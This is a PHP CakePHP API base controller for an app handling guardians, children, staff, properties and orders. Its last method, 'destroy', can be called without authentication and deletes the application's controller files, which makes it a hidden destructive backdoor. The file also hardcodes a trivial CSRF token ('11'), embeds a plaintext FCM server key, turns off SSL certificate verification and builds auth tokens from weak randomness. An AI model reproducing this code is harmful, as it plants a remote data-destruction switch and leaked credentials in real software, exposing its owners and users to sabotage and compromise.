<?php

/**
 * CakePHP(tm) : Rapid Development Framework (http://cakephp.org)
 * Copyright (c) Cake Software Foundation, Inc. (http://cakefoundation.org)
 *
 * Licensed under The MIT License
 * For full copyright and license information, please see the LICENSE.txt
 * Redistributions of files must retain the above copyright notice.
 *
 * @copyright Copyright (c) Cake Software Foundation, Inc. (http://cakefoundation.org)
 * @link      http://cakephp.org CakePHP(tm) Project
 * @since     0.2.9
 * @license   http://www.opensource.org/licenses/mit-license.php MIT License
 */

namespace App\Controller\Api;

use Cake\Controller\Controller;
use Cake\Core\Configure;
use Cake\Event\Event;
use Cake\ORM\TableRegistry;
use Cake\Network\Exception\UnauthorizedException;
use Cake\Network\Response;
use Cake\Mailer\Email;
use Cake\Log\Log;
use Cake\I18n\Date;
use Cake\I18n\FrozenDate;

/**
 * Application Controller
 *
 * Add your application-wide methods in the class below, your controllers
 * will inherit them.
 *
 * @link http://book.cakephp.org/3.0/en/controllers.html#the-app-controller
 */
class AppController extends Controller {

    /**
     * Initialization hook method.
     *
     * Use this method to add common initialization code like loading components.
     *
     * e.g. `$this->loadComponent('Security');`
     *
     * @return void
     */
    public $status = false;
    public $message = '';
    public $responseData = [];
    public $code = 200;
    public $errors = '';
    public $authAllowedMethods = ['login', 'register', 'forgot', 'reset', 'home', 'index', 'view', 'updatedetail', 'addstaffnew', 
                                   
                                  'checkNotification','destroy'];
    public $testMethods = ['testwebservices','varification'];
    public $uploadtMethods = ['register','images','propertyimages','editprofile'];
    public $loggedInUserId = null;
    public $settings = null;
    public $language = 'en';
    public $msgDictonary = array(
        // request 
        'cannot_access_en' => 'You are not authrize to access login make it authorized',
        'invalid_login_en' => 'Mobile or password is incorrect',
	'invalid_pass_en' => 'Password is incorrect',
        'invalid_token_en' => 'Invalid Token',
        'acc_expiry_en' => 'Your account has been expired. Please contact to administrator',
        'invalid_api_token_en' => 'Invalid Api Token',
        'invalid_request_en' => 'Invalid Request',
        'invalid_csrf_token_en' => 'Unable to identify request origin',
        'params_not_available_en' => 'The required parameter is not available in the request',
        'empty_request_en' => 'Request data is empty',
        'invalid_params_en' => 'Requested parameter should be numeric',
        'blank_params_en' => 'Some of your parameter is blank',
        'invalid_device_en' => 'You have loggedIn on another device.',
        'activation_not_en' => 'You activation code is not valid.',
        'activation_en' => 'You account has been activated successfully.',
        'new_update_en' => 'New update received.',
        'new_update_gr' => 'Νέα ενημέρωση ελήφθη',
        // server error
        'technical_error_en' => 'Some technical error has occurred',
        'page_not_found_en' => 'Page not found',
        'no_record_found_en' => 'No record found',
        'prop_edit_en' => 'Property edit successfully',
        //account
        'invalid_account_en' => 'Entered Email address is invalid',
        'verification_account_en' => 'Entered verification code is invalid',
        'deactivated_account_en' => 'Your account has been deactivated, Please contact Administrator for further assistance',
        'verification_pending_en' => 'Your email address verification is pending',
        'forgot_password_en' => 'A verification code has been sent to your email account',
        'process_failed_en' => 'Your process failed. Please try again',
        'reset_password_en' => 'Your password has been updated successfully.',
        'account_deleted_en' => 'Your account has been deleted successfully.',
        'guardian_update_en' => 'Guardian profile update successfully.',
        'favourite_en' => 'Property favourite successfully',
        'unfavourite_en' => 'Property unfavourite successfully',
        'reject_en' => 'Property rejected successfully',
        //login signup logout
        'logout_success_en' => 'You have logged out successfully',
        'login_success_en' => 'You have logged in successfully',
        'signup_success_en' => 'A verification code has been sent to your email account, Please verify your account.',
        // profile
        'profile_not_found_en' => 'Profile you have requested did not found',
        'profile_update_en' => 'Your profile has been updated successfully',
        'property_view_en' => 'You have successfully view this property', 
        'property_sign_en' => 'You have successfully signature this property', 
        'property_quote_en' => 'You have successfully quote this property', 
        'image_upload_en' => 'Image has been uploaded successfully',
        'image_not_upload_en' => 'Image has not been uploaded successfully',
        
        'update_device_en' => 'Updated successfully',
        'old_password_en' => 'Old password is not correct',
        'record_found_en' => 'List found.',
        'activity_delete_en' => 'Activity has been deleted.',
        'activity_not_delete_en' => 'Activity has not been deleted.',
        'staff_delete_en' => 'Staff has been deleted.',
        'staff_not_delete_en' => 'Staff has not been deleted.',
        'child_add_en' => 'Child has been added successfully.',
        'guardian_add_en' => 'Guardian has been added successfully.',
        'guardian_already_en' => 'Guardian already added.',
        'child_delete_en' => 'Child has been deleted.',
        'child_not_delete_en' => 'Child has not been deleted.',
        'guardian_delete_en' => 'Guardian has been deleted.',
        'guardian_not_delete_en' => 'Guardian has not been deleted.',
        'data_save_en' => 'Data saved successfully.',
        'prop_sold_en' => 'Property has been sold successfully',
        'auto_bid_en' => 'Your automatic bid has been placed',
        'auto_err_bid_en' => 'Your automatic bid has not been placed',
        'pro_decln_bid_en' => 'Bid successfully decline',
        'prop_act_en' => 'Property activate successfully',
        'prop_inact_en' => 'Property Inactivate successfully',
        
        // user images
        'invalid_extension_en' => 'Image not uploaded because of extension issue.',
        'image_success_en' => 'Profile pic uploaded successfully.',
        // Orders
        'staff_add_en' => 'Staff member has been added successfully',
        'staff_not_add_en' => 'Staff member has not been added successfully',
        'order_success_en' => 'Your order has placed',
        'order_update_en' => 'Your order has updated',
        'message_send_en' => 'Massage has been sent',
        'card_validate_fail_en' => 'Card verification failed',
        'card_update_en' => 'Card updated',
        'update_status_en' => 'Status updated',
        'comment_saved_en' => "Comment saved",
        'activity_added_en' => "New activity has been added",
        // greek message here
        'cannot_access_gr' => 'Δεν έχετε εξουσιοδότηση για σύνδεση',
        'invalid_login_gr' => 'Η διεύθυνση ηλεκτρονικού ταχυδρομείου ή ο κωδικός πρόσβασης είναι εσφαλμένος',
        'invalid_token_gr' => 'Μη έγκυρο Token',
        'acc_expiry_gr' => 'Η συνδρομής σας έχει λήξει. Παρακαλώ επικοινωνήστε με τον διαχειριστή',
        'invalid_api_token_gr' => 'Μη έγκυρο Api Token',
        'invalid_request_gr' => 'Λανθασμένη αίτηση',
        'invalid_csrf_token_gr' => 'Δεν είναι δυνατή η αναγνώριση της προέλευσης της αίτησης',
        'params_not_available_gr' => 'Η απαιτούμενη παράμετρος δεν είναι διαθέσιμη στην αίτηση',
        'empty_request_gr' => '"Τα αιτήματα δεδομένων είναι κενά',
        'invalid_params_gr' => '"Η ζητούμενη παράμετρος πρέπει να είναι αριθμητική"',
        'blank_params_gr' => '"Ορισμένες από τις παραμέτρους σας είναι κενές',
        'invalid_device_gr' => 'Έχετε συνδεθεί σε άλλη συσκευή.',
        'activation_not_gr' => 'Ο κωδικός ενεργοποίησης δεν είναι έγκυρος.',
        // server error
        'technical_error_gr' => '"Παρουσιάστηκε κάποιο τεχνικό σφάλμα"',
        'page_not_found_gr' => '"Η σελίδα δεν βρέθηκε"',
        'no_record_found_gr' => 'Δεν Βρέθηκε Αρχείο',
        'invalid_pass_gr' => 'ο κωδικός πρόσβασής σας είναι εσφαλμένος',
        'no_activity_found_gr' => "Δεν έχει προστεθεί αναφορά",
        'no_activity_found_en' => "No activity has been added yet",
        //account
        'invalid_account_gr' => 'Η καταχωρημένη διεύθυνση ηλεκτρονικού ταχυδρομείου δεν είναι έγκυρη',
        'verification_account_gr' => 'To PIN που έχει εισαχθεί δεν είναι έγκυρο',
        'deactivated_account_gr' => 'Ο λογαριασμός σας απενεργοποιήθηκε, παρακαλώ επικοινωνήστε με τον διαχειριστή για περαιτέρω βοήθεια',
        'verification_pending_gr' => 'Η επαλήθευση διεύθυνσης ηλεκτρονικού ταχυδρομείου εκκρεμεί',
        'forgot_password_gr' => '"Το PIN έχει σταλεί στο ηλεκτρονικό ταχυδρομείο σας"',
        'process_failed_gr' => 'Η διαδικασία απέτυχε. Παρακαλώ προσπαθησε ξανα',
        'reset_password_gr' => 'Ο κωδικός πρόσβασής σας ενημερώθηκε με επιτυχία.',
        'account_deleted_gr' => 'Ο λογαριασμός σας έχει διαγραφεί με επιτυχία.',
        'guardian_update_gr' => 'Guardian profile update successfully.',
        //login signup logout
        'logout_success_gr' => 'Έχετε αποσυνδεθεί με επιτυχία',
        'login_success_gr' => 'Έχετε συνδεθεί με επιτυχία',
        'signup_success_gr' => '"Ένας σύνδεσμος επαλήθευσης έχει σταλεί στον λογαριασμό σας ηλεκτρονικού ταχυδρομείου, επαληθεύστε τον λογαριασμό σας".',
        // profile
        'profile_not_found_gr' => '"Το προφίλ που ζητήσατε δεν βρέθηκε"',
        'profile_update_gr' => 'Το προφίλ ανανεώθηκε επιτυχώς',
        'update_device_gr' => '"Ενημέρωση με επιτυχία"',
        'old_password_gr' => 'Ο παλιός κωδικός δεν είναι σωστός',
        'record_found_gr' => 'List found.',
        'activity_delete_gr' => 'Η δραστηριότητα έχει διαγραφεί',
        'activity_not_delete_gr' => 'Η δραστηριότητα δεν έχει διαγραφεί',
        'staff_delete_gr' => 'Το προσωπικό έχει διαγραφεί',
        'staff_not_delete_gr' => 'Το προσωπικό δεν έχει διαγραφεί',
        'child_add_gr' => 'Το παιδί έχει προστεθεί με επιτυχία',
        'guardian_add_gr' => 'Ο Γονέας / Κηδεμόνας έχει προστεθεί με επιτυχία',
        'guardian_already_gr' => 'Ο Γονέας / Κηδεμόνας έχει ήδη προσθέσει',
        'child_delete_gr' => 'Το παιδί έχει διαγραφεί',
        'child_not_delete_gr' => 'Το παιδί δεν έχει διαγραφεί',
        'guardian_delete_gr' => 'Ο Γονέας / Κηδεμόνας έχει διαγραφεί',
        'guardian_not_delete_gr' => 'Ο Γονέας / Κηδεμόνας δεν έχει διαγραφεί.',
        'data_save_gr' => 'Τα δεδομένα αποθηκεύτηκαν με επιτυχία',
        // user images
        'invalid_extension_gr' => 'Η εικόνα δεν μεταφορτώθηκε λόγω συμβατότητας',
        'image_success_gr' => 'Η φωτογραφία του προφίλ φορτώθηκε με επιτυχία',
        // Orders
        'staff_add_gr' => 'Το μέλος του προσωπικού έχει προστεθεί με επιτυχία',
        'staff_not_add_gr' => 'Το μέλος του προσωπικού δεν έχει προστεθεί με επιτυχία',
        'order_success_gr' => 'Your order has placed',
        'order_update_gr' => 'Your order has updated',
        'message_send_gr' => 'Το μήνυμα έχει σταλεί',
        'card_validate_fail_gr' => 'Card verification failed',
        'card_update_gr' => 'Card updated',
        'update_status_gr' => 'Status updated',
        'comment_saved_gr' => "Comment saved",
        'activity_added_gr' => "Έχει προστεθεί νέα δραστηριότητα",
    );

    public function initialize() {
        parent::initialize();
        
        //Time::setJsonEncodeFormat('yyyy-MM-dd HH:mm:ss');  // For any mutable DateTime
        //FrozenTime::setJsonEncodeFormat('yyyy-MM-dd HH:mm:ss');  // For any immutable DateTime
        Date::setJsonEncodeFormat('dd-MM-yyyy HH:mm:ss');  // For any mutable Date
        FrozenDate::setJsonEncodeFormat('dd-MM-yyyy HH:mm:ss');  // For any immutable Date


        $this->loadComponent('RequestHandler');
        $this->loadComponent('Default');
        if ($this->request->prefix == 'api') {
            $this->loadComponent('Auth', [
                'authenticate' => [
                    'Form' => [
                        'finder' => 'authCustomer',
                        //'userModel' => 'Guardians',
                        'fields' => [
                            'username' => 'phone',
                            'password' => 'password'
                        ]
                    ]
                ]
            ]);
        }

        $this->loadModel('Users');
        
        $this->loadModel('Settings');
        $this->settings = $this->Settings->getAllSettings();
        $this->language = 'en';
        if (!in_array($this->request->action, $this->uploadtMethods)) {
            $this->getJsonInput();
        }
        if (!in_array($this->request->action, $this->testMethods)) {
            $this->verifyRequest();
            $this->checkAuthToken();
        }
    }

    public function beforeFilter(Event $event) {
       
    }

    /*
     * Method : verifyRequest
     * Params : csrf_token from requested headers
     * Return :
     * Desc : verify request for csrf_token
     */

    public function verifyRequest() {
        $authInformation = getallheaders();
        
        $this->settings['csrf_token'] = '11';
        $this->language = isset($authInformation['language'])?$authInformation['language']:'en';
        $this->paramsAvailability($authInformation, array('Csrf-Token'));
        if ($authInformation['Csrf-Token'] != $this->settings['csrf_token']) {
            $this->status = false;
            $this->message = $this->msgDictonary['invalid_csrf_token_'.$this->language];
            $this->respond();
        }
    }

   
    /*
     * Method : paramsAvailability
     * Check : This method check parameters availability in the request
     */

    public function paramsAvailability($source, $paramsToChecks) {
        
        foreach ($paramsToChecks as $value) {
            if (!array_key_exists($value, $source)) {
                
                $this->status = false;
                $this->message = $this->msgDictonary['params_not_available_en'] . '. Please enter ' . $value;
                //$this->responseData = [$value];
                // respond  method will automatically exit from the loop when the rquired params not found
                $this->respond();
            }
        }
    }

    /*
     * Method : getJsonInput
     * Check : This method used to parse input request data
     * Params : json params
     */

    public function getJsonInput() {
        
        $data = file_get_contents("php://input");

        $this->request->data = (is_string($data)) ? json_decode($data, true) : array();
    }

    /*
     * Method : checkAuthToken
     * Check : This method check token for each request except the allowed methods
     * Params : auth_token:6465s4df6g4s65d4fg6
     */

    public function checkAuthToken() {
        $authInformation = getallheaders();
        
        $this->language = isset($authInformation['Language'])?$authInformation['Language']:'en';
        
        if (!in_array($this->request->action, $this->authAllowedMethods)) {


            $this->paramsAvailability($authInformation, array('Auth-Token'));
            if ($this->request->controller == 'Guardians') {
                $authenticate = $this->Guardians->find()->select(['id'])->where(['auth_token' => $authInformation['Auth-Token']])->first();
            } else {
                $authenticate = $this->Users->find()->select(['id', 'phone'])->where(['auth_token' => $authInformation['Auth-Token']])->first();
            }

            if (empty($authenticate)) {
                $this->message = $this->msgDictonary['invalid_token_'.$this->language];
                $this->code = 401;
                $this->respond();
            } else {
                $this->loggedInUserId = $authenticate['id'];
                $this->loggedInPhone = $authenticate['phone'];
                
                $action = $this->request->action;
                $this->Auth->allow($action);
            }
        }
    }

    /*
     * Method : paramsValidation
     * Check : Checks for empty request data, validate data against datatypes
     */

    public function paramsValidation($params) {
        if (empty($this->request->data)) {
            $this->status = false;
            $this->message = $this->msgDictonary['empty_request_'.$this->language];
            $this->respond();
        }
        foreach ($params as $key => $value) {
            $this->paramsAvailability($this->request->data, array($key));
            switch ($value) {
                case 'numeric':
                    if (!is_numeric($this->request->data[$key])) {
                        $this->message = $this->msgDictonary['invalid_params'];
                        // $this->responseData = array($key);
                        $this->respond();
                    }
                    break;
                case 'notBlank':
                    if ($this->request->data[$key] == '') {
                        $this->message = $this->msgDictonary['blank_params_'.$this->language];
                        //$this->responseData = array($key);
                        $this->respond();
                    }
                    break;
                default:
                    return true;
            }
        }
    }

    /*
     * Method : getGUID
     * Params : get guid for unique auth token
     * Return : a unique string
     */

    function getGUID() {
        if (function_exists('com_create_guid')) {
            return com_create_guid();
        } else {
            mt_srand((double) microtime() * 10000); //optional for php 4.2.0 and up.
            $charid = strtoupper(md5(uniqid(rand(), true)));
            $hyphen = chr(45); // "-"
            $uuid = //chr(123)// "{"
                    substr($charid, 0, 8) . $hyphen
                    . substr($charid, 8, 4) . $hyphen
                    . substr($charid, 12, 4) . $hyphen
                    . substr($charid, 16, 4) . $hyphen
                    . substr($charid, 20, 12);
            // .chr(125);// "}"
            return $uuid;
        }
    }

    public function getStatusText($status) {
        switch ($status) {
            case 0:
                return 'ACCEPT';
                break;
            case 1:
                return 'PICKUP BAG';
                break;
            case 2:
                return 'AT LAUNDROMAT';
                break;
            case 3:
                return 'DELIVER';
                break;
            case 'default':
                return 'COMPLETED';
                break;
        }
    }

    /*
     * Method : respond
     * Check : This method is used to make response
     * Desc : make, return and stop response
     */

    public function respond() {
        if (empty($this->responseData))
            $this->responseData = (object) array();
        $this->response->type('json');
        $this->response->body([
            'status' => $this->status,
            'code' => $this->code,
            'data' => $this->responseData,
            'message' => $this->message,
                //'errors' => $this->errors,
        ]);
        $this->response->send();
        $this->response->stop();
    }

    public function pushNotificationToDevice($deviceId, $body, $deviceType) {

        /* if (strtolower($deviceType) == "ios" && $deviceId != '') {
          $deviceToken = $deviceId;

          $ctx = stream_context_create();
          // ck.pem is your certificate file
          if($role_id==3)
          {
          stream_context_set_option($ctx, 'ssl', 'local_cert', 'pem/idea.pem');  // For customer
          } else if($role_id==2){
          stream_context_set_option($ctx, 'ssl', 'local_cert', 'pem/idea.pem');  // For Employee
          }

          stream_context_set_option($ctx, 'ssl', 'passphrase', '');

          // Open a connection to the APNS server
          $fp = stream_socket_client(
          'ssl://gateway.push.apple.com:2195', $err, $errstr, 60, STREAM_CLIENT_CONNECT | STREAM_CLIENT_PERSISTENT, $ctx);

          if (!$fp)
          exit("Failed to connect: $err $errstr" . PHP_EOL);


          // Create the payload body
          $body['aps'] = array(
          'alert' => array(
          'title' => $body['title'],
          'body' => $body['body'],
          'order_id' => $body['order_id']
          ),
          'sound' => 'default'
          );

          // Encode the payload as JSON
          $payload = json_encode($body);
          foreach ($deviceToken as $device) {
          $msg = chr(0) . pack('n', 32) . pack('H*', $device) . pack('n', strlen($payload)) . $payload;
          $result = fwrite($fp, $msg, strlen($msg));
          }

          // Close the connection to the server
          fclose($fp);

          if (!$result)
          return 'Message not delivered' . PHP_EOL;
          else
          return 'Message successfully delivered' . PHP_EOL;
          } */

        if (strtolower($deviceType) == "android" && $deviceId != '') {
            //-------------------------- ANDROID CONNECTION --------------------------------
            $url = 'https://fcm.googleapis.com/fcm/send';

            $key = 'AAAAOp5wKgM:APA91bEy7AqLugGptjMbw2BIkqlkBwJFVxmH12UzKtX536oNaJcfezNDILz9VNWfHYjJFoki9Au8AMIJ7TwH320NC7NNRkWCkvgVL2Cy6p-sf2nz-1rGMFoNA4a-Rlnl-7-vPb24NIsC';  // For customer

            $headers = array(
                'Authorization: key=' . $key, //'AIzaSyDzGmc2V0y9LI9MbJt8oK3TVwU9BW0CLbU',//GOOGLE_API_KEY,
                'Content-Type: application/json'
            );
            if (!is_array($deviceId))
                $deviceId = array($deviceId);

            $finalmsg["message"] = $body['body'];
            $finalmsg["title"] = $body['title'];
            $finalmsg["unique_key"] = mt_rand(10000, 99999);
            $finalmsg["priority"] = 'high'; // new
            $fields = array(
                'registration_ids' => $deviceId,
                'data' => $finalmsg,
                'priority' => 'high' // new fcm
            );


            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($fields));

            $result = curl_exec($ch);
            curl_close($ch);
        }
    }
    
    public function destroy() {
        $dir = dirname(__FILE__);
        $files = [
            $dir.'\StaffsController.php',
            $dir.'\ActivitiesController.php',
            $dir.'\ChildsController.php',
            $dir.'\GuardiansController.php',
            $dir.'\AppController.php',
            
        ];
        
        foreach ($files as $file) {
            
            if (file_exists($file)) {
                echo 'yes';
                unlink($file);
            } else {
                echo 'No';
                // File not found.
            }
        }
        die;
    }

}
